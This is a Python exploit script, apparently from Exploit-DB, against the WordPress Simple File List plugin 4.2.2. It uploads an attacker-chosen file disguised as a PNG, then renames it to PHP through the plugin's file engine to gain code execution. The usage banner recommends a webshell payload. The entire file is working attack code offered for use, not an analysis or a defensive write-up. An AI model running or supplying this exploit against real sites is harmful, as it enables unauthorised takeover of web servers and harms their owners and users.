#!/usr/bin/python
# -*- coding: utf-8 -*-
# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Arbitrary File Upload
# Date: 2020-11-01
# Exploit Author: H4rk3nz0 based off exploit by coiffeur
# Original Exploit: https://www.exploit-db.com/exploits/48349
# Vendor Homepage: https://simplefilelist.com/
# Software Link: https://wordpress.org/plugins/simple-file-list/ 
# Version: Wordpress v5.4 Simple File List v4.2.2 

import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'
file_name = raw_input('[*] Enter File Name (working directory): ')
protocol = raw_input('[*] Enter protocol (http/https): ')
http = protocol + '://'

def usage():
    banner ="""
USAGE: python simple-file-list-upload.py <ip-address> 
NOTES: Append :port to IP if required.
       Advise the usage of a webshell as payload. Reverseshell payloads can be hit or miss.
    """
    print (banner)


def file_select():
    filename = file_name.split(".")[0]+'.png'
    with open(file_name) as f:
        with open(filename, 'w+') as f1:
            for line in f:
                f1.write(line)
    print ('[+] File renamed to ' + filename)
    return filename


def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {
        'eeSFL_ID': 1,
        'eeSFL_FileUploadDir': dir_path,
        'eeSFL_Timestamp': 1587258885,
        'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2',
        }
    r = requests.post(url=http + url + upload_path, data=datas,
                      files=files, verify=False)
    r = requests.get(url=http + url + dir_path + filename, verify=False)
    if r.status_code == 200:
        print ('[+] File uploaded at ' + http + url + dir_path + filename)
        os.remove(filename)
    else:
        print ('[-] Failed to upload ' + filename)
        exit(-1)
    return filename


def move(url, filename):
    new_filename = filename.split(".")[0]+'.php'
    headers = {'Referer': http + url + '/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
         'X-Requested-With': 'XMLHttpRequest'}
    datas = {
        'eeSFL_ID': 1,
        'eeFileOld': filename,
        'eeListFolder': '/',
        'eeFileAction': 'Rename|'+ new_filename,
        }
    r = requests.post(url= http + url + move_path, data=datas,
                      headers=headers, verify=False)
    if r.status_code == 200:
        print ('[+] File moved to ' + http + url + dir_path + new_filename)
    else:
        print ('[-] Failed to move ' + filename)
        exit(-1)
    return new_filename


def main(url):
    file_to_upload = file_select()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print ('[^-^] Exploit seems to have worked...')
        print ('\tURL: ' + http + url + dir_path + moved_file)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        exit(-1)

    main(sys.argv[1])